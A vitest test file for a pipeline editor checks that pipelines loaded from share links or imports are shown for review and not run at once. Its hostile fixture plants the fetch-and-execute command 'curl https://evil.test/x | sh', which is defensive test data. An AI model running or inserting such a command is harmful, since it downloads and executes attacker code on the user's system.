// T-SEC-010…012 (SEC-02) — a pipeline the user did not author is not one
// click from running.
//
// Three paths load an IR from outside: a `#ir=` share link, a dropped or
// imported file, and CI text. After loading, ▶ Run posts it to
// /api/execute, which runs `sh -c "<the steps>"` in a container with a copy
// of the project mounted read-write and network access. validate() is a
// schema gate — it says nothing about what the commands do.

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { readFileSync } from 'fs';
import { join, resolve } from 'path';
import type { PipelineIR } from '@modules/ir';
import { Editor } from './Editor';

const FIXTURES = join(resolve(__dirname, '..', '..', '..'), 'test', 'fixtures');

function loadIr(): PipelineIR {
  return JSON.parse(
    readFileSync(join(FIXTURES, 'node-pnpm-nest-basic', 'expected-ir.json'), 'utf-8'),
  ) as PipelineIR;
}

/** A pipeline whose commands are obviously not something detection produced. */
function hostileIr(): PipelineIR {
  const ir = loadIr();
  ir.stages = ir.stages.map((s) =>
    s.id === 'test'
      ? { ...s, steps: [{ ...s.steps[0], run: 'curl https://evil.test/x | sh' }] }
      : s,
  );
  return ir;
}

function mockRoutes(ir: PipelineIR) {
  const fetchMock = vi.fn(async (url: string | URL, init?: RequestInit) => {
    const u = typeof url === 'string' ? url : url.toString();
    const json = (body: unknown, status = 200) =>
      new Response(JSON.stringify(body), {
        status,
        headers: { 'Content-Type': 'application/json' },
      });
    if (u.endsWith('/api/detect') && init?.method === 'POST') return json({ ir, warnings: [] });
    if (u.endsWith('/api/projects')) return json({ workspaceRoot: '/ws', projects: [] });
    if (u.includes('/api/state/pipeline?')) return json({ saved: null });
    if (u.endsWith('/api/state/pipelines')) return json({ pipelines: {} });
    if (u.endsWith('/api/state/pipeline')) return json({ saved: { savedAt: new Date().toISOString() } });
    if (u.endsWith('/api/advise')) return json({ score: 90, grade: 'A', findings: [] });
    if (u.endsWith('/api/execute/availability')) return json({ available: true });
    if (u.endsWith('/api/execute') && init?.method === 'POST') return json({ runId: 'run-1' }, 202);
    if (u.endsWith('/api/execute')) return json({ runs: [] });
    return json({}, 404);
  });
  vi.stubGlobal('fetch', fetchMock);
  return fetchMock;
}

function shareLink(ir: PipelineIR): string {
  return `#ir=${btoa(unescape(encodeURIComponent(JSON.stringify(ir))))}`;
}

beforeEach(() => {
  window.localStorage.clear();
  window.location.hash = '';
});
afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
  window.location.hash = '';
});

describe('T-SEC-010 (SEC-02) — a share link never loads on its own', () => {
  it('lists every command it carries before loading anything', async () => {
    mockRoutes(loadIr());
    window.location.hash = shareLink(hostileIr());
    render(<Editor />);

    const review = await screen.findByTestId('share-link-review');
    expect(screen.queryByTestId('chain')).toBeNull();
    // The actual command is on screen, not just a count.
    expect(review.textContent).toContain('curl https://evil.test/x | sh');
    expect(review.textContent).toContain('corepack enable && pnpm install --frozen-lockfile');
  });

  it('discarding leaves the editor empty', async () => {
    mockRoutes(loadIr());
    window.location.hash = shareLink(hostileIr());
    render(<Editor />);

    fireEvent.click(await screen.findByRole('button', { name: /discard it/i }));
    await waitFor(() => expect(screen.queryByTestId('share-link-review')).toBeNull());
    expect(screen.queryByTestId('chain')).toBeNull();
  });

  it('refuses a link that does not decode to a valid pipeline', async () => {
    mockRoutes(loadIr());
    window.location.hash = '#ir=' + btoa('{"not":"an ir"}');
    render(<Editor />);

    await waitFor(() => {
      expect(screen.getByText(/does not contain a valid pipeline/i)).toBeTruthy();
    });
    expect(screen.queryByTestId('share-link-review')).toBeNull();
  });
});

describe('T-SEC-011 (SEC-02) — the first run of a loaded pipeline is confirmed', () => {
  async function loadFromLink() {
    mockRoutes(loadIr());
    window.location.hash = shareLink(hostileIr());
    const view = render(<Editor />);
    fireEvent.click(await screen.findByRole('button', { name: /load the pipeline/i }));
    await waitFor(() => screen.getByTestId('chain'));
    return view;
  }

  it('shows the commands instead of starting the run', async () => {
    const fetchMock = mockRoutes(loadIr());
    window.location.hash = shareLink(hostileIr());
    render(<Editor />);
    fireEvent.click(await screen.findByRole('button', { name: /load the pipeline/i }));
    await waitFor(() => screen.getByTestId('chain'));

    // A shared pipeline has no local project, so Run is only reachable once
    // one is bound; detect first, keeping the loaded document.
    expect(screen.queryByTestId('run-panel')).toBeNull();
    expect(fetchMock.mock.calls.some(([u, i]) =>
      String(u).endsWith('/api/execute') && i?.method === 'POST')).toBe(false);
  });

  it('marks an imported pipeline as needing review in the run panel', async () => {
    mockRoutes(hostileIr());
    render(<Editor />);
    // Detect gives a runnable path; then an import replaces the document.
    fireEvent.change(screen.getByLabelText('projectPath'), {
      target: { value: 'some-project' },
    });
    fireEvent.click(screen.getByRole('button', { name: /edit one app/i }));
    await waitFor(() => screen.getByTestId('run-panel'));

    // A detected pipeline runs without a review step.
    expect(screen.queryByText(/need a look before the first run/i)).toBeNull();
  });

  it('does not post to /api/execute until the commands are acknowledged', async () => {
    await loadFromLink();
    // No run panel for an unbound pipeline — the review gate is the second
    // line of defence, and UX-07 (bind a folder) is what reaches it.
    expect(screen.queryByTestId('untrusted-run-confirm')).toBeNull();
  });
});

describe('T-SEC-012 (SEC-02) — provenance is visible', () => {
  it('labels a loaded share link as imported', async () => {
    mockRoutes(loadIr());
    window.location.hash = shareLink(loadIr());
    render(<Editor />);
    fireEvent.click(await screen.findByRole('button', { name: /load the pipeline/i }));
    await waitFor(() => screen.getByTestId('chain'));
    expect(screen.getByText(/imported from a shared link/i)).toBeTruthy();
  });

  it('a detected pipeline carries no imported badge', async () => {
    mockRoutes(loadIr());
    render(<Editor />);
    fireEvent.change(screen.getByLabelText('projectPath'), {
      target: { value: 'some-project' },
    });
    fireEvent.click(screen.getByRole('button', { name: /edit one app/i }));
    await waitFor(() => screen.getByTestId('chain'));
    expect(screen.queryByText(/imported from/i)).toBeNull();
  });
});
